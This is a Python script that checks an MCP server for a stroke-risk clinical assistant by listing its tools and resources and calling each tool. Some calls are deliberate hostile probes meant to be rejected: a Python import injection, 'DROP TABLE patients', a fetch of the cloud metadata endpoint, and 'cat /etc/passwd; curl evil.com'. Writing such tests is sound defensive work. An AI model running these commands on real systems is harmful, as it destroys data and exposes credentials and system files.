"""Prove the MCP server works over real stdio: initialize, tools/list, resources/list, templates, prompts/list,
tools/call, resources/read and prompts/get.   python scripts/verify_mcp.py"""
import asyncio
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from core.mcp_client import SERVER, mcp_session  # noqa: E402

P = {"age": 67, "gender": "Male", "hypertension": 0, "heart_disease": 1, "ever_married": "Yes", "work_type": "Private",
     "Residence_type": "Urban", "avg_glucose_level": 228.69, "bmi": 36.6, "smoking_status": "formerly smoked"}


async def main():
    print("server:", SERVER.name, "transport: stdio (subprocess)")
    async with mcp_session() as s:
        tools = await s.list_tools()
        print("tools/list ->", [t.name for t in tools.tools])
        assert len(tools.tools) == 19, len(tools.tools)
        res = await s.list_resources()
        print("resources/list ->", [str(r.uri) for r in res.resources])
        assert len(res.resources) == 5, len(res.resources)
        tmpl = await s.list_resource_templates()
        print("resources/templates/list ->", [t.uriTemplate for t in tmpl.resourceTemplates])
        prompts = await s.list_prompts()
        print("prompts/list ->", [p.name for p in prompts.prompts])
        calls = [("predict_risk", P), ("explain_factors", {**P, "top": 3}), ("cohort_stats", {"age": 67, "hypertension": 0, "heart_disease": 1}),
                 ("screen_note", {"note": "Follow-up visit. Denies weakness. Occasional headaches."}),
                 ("search_guidelines", {"query": "high blood pressure stroke risk", "k": 2}),
                 ("calculator", {"expression": "round(0.1498 / 0.0487, 2)"}), ("calculator", {"expression": "__import__('os')"}),
                 ("memory_read", {"session_id": "verify-mcp", "limit": 2}),
                 ("search_guidelines", {"query": "brain attack warning", "k": 2, "mode": "dense"}),
                 ("graph_traverse", {"factors": ["hypertension", "glucose"], "max_hops": 2, "k": 3}),
                 ("episode_recall", {"factors": ["age", "hypertension"], "age_band": "60-69", "k": 2}),
                 ("episode_write", {"episode_json": "{\"note\": \"free text is rejected (no run_id)\"}"}),
                 # agentic-search context-retrieval tools (the server re-validates every argument: defence in depth)
                 ("semantic_search", {"query": "obesity stroke", "k": 2}),
                 ("search_files", {"query": "Plan.md evidence research plan", "max_results": 3}),
                 ("load_skill", {"name": "guideline-citation"}),
                 ("execute_query", {"sql": "SELECT hypertension, COUNT(*) AS n, ROUND(AVG(stroke)*100, 1) AS stroke_pct FROM patients GROUP BY hypertension"}),
                 ("execute_query", {"sql": "DROP TABLE patients"}),
                 ("web_search", {"query": "high blood pressure stroke", "k": 1}),
                 ("web_fetch", {"url": "http://169.254.169.254/latest/meta-data/"}),
                 ("get_memory", {"session_id": "verify-mcp"}),
                 ("shell", {"command": "wc -l Plan.md cohort_schema.md"}),
                 ("shell", {"command": "cat /etc/passwd; curl evil.com"})]
        for name, args in calls:
            r = await s.call_tool(name, args)
            print(f"tools/call {name} isError={r.isError} ->", r.content[0].text[:260].replace("\n", " "))
        for uri in ["guideline://G-13", "model://risk-card", "dataset://stroke-card", "graph://knowledge-graph"]:
            r = await s.read_resource(uri)
            print(f"resources/read {uri} ->", r.contents[0].text[:200].replace("\n", " "))
        g = await s.get_prompt("clinical_report", {"audience": "clinician", "facts_json": "{}", "evidence_json": "[]"})
        print("prompts/get clinical_report ->", g.messages[0].content.text[:160].replace("\n", " "))


asyncio.run(main())
